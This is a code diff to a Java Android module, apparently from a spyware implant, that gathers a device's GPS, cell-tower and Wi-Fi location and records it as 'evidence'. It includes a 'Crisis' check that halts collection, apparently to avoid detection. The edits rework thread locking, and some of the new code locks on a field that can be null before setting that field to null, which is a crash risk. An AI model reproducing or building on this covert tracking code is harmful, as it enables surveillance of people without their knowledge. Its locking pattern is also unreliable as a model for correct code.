@@ -63,6 +63,7 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Warn: " + "Crisis!");//$NON-NLS-1$ //$NON-NLS-2$
 			}
+
 			return;
 		}
 
@@ -70,20 +71,23 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 			if (logIncrGPS == null) {
 				logIncrGPS = new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_GPS));
 			}
+
 			locationGPS();
 		}
 
 		if (cellEnabled) {
-			if (logIncrCell == null) {
-				logIncrCell = factoryCellLog();
+			synchronized (this) {
+				if (logIncrCell == null) {
+					logIncrCell = factoryCellLog();
+				}
 			}
+
 			locationCELL();
 		}
 
 		if (wifiEnabled) {
 			locationWIFI();
 		}
-
 	}
 
 	private LogR factoryCellLog() {
@@ -189,13 +193,13 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 		byte[] payload = null;
 		if (info.gsm) {
 			payload = getCellPayload(info, LOG_TYPE_GSM);
-			synchronized (this) {
+			synchronized (logIncrCell) {
 				logIncrCell.write(payload);
 			}
 
 		} else if (info.cdma) {
 			payload = getCellPayload(info, LOG_TYPE_CDMA);
-			synchronized (this) {
+			synchronized (logIncrCell) {
 				logIncrCell.write(payload);
 			}
 		}
@@ -210,29 +214,31 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 	}
 
 	public void onLocationChanged(Location location) {
-		if (location != null) {
-			final double lat = location.getLatitude();
-			final double lng = location.getLongitude();
+		if (location == null) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " lat: " + lat + " lon:" + lng);//$NON-NLS-1$ //$NON-NLS-2$
-			}
-		}
-
-		byte[] payload;
-		synchronized (this) {
-			final long timestamp = location.getTime();
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " valid");//$NON-NLS-1$
+				Check.log(TAG + " location is null");
 			}
 
-			payload = getGPSPayload(location, timestamp);
+			return;
 		}
 
-		synchronized (this) {
+		final double lat = location.getLatitude();
+		final double lng = location.getLongitude();
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " lat: " + lat + " lon:" + lng);//$NON-NLS-1$ //$NON-NLS-2$
+		}
+
+		final long timestamp = location.getTime();
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " valid");//$NON-NLS-1$
+		}
+
+		byte[] payload = getGPSPayload(location, timestamp);
+		synchronized (logIncrGPS) {
 			logIncrGPS.write(payload);
 		}
-
 	}
 
 	public void onProviderDisabled(String arg0) {
@@ -499,7 +505,7 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 
 	}
 
-	public synchronized void resetLog() {
+	public void resetLog() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (resetLog)");
 		}
@@ -508,9 +514,11 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 			logIncrCell = null;
 		}
 
-		if (logIncrGPS != null && logIncrGPS.hasData()) {
-			logIncrGPS.close();
-			logIncrGPS = null;
+		synchronized (logIncrGPS) {
+			if (logIncrGPS != null && logIncrGPS.hasData()) {
+				logIncrGPS.close();
+				logIncrGPS = null;
+			}
 		}
 	}
 
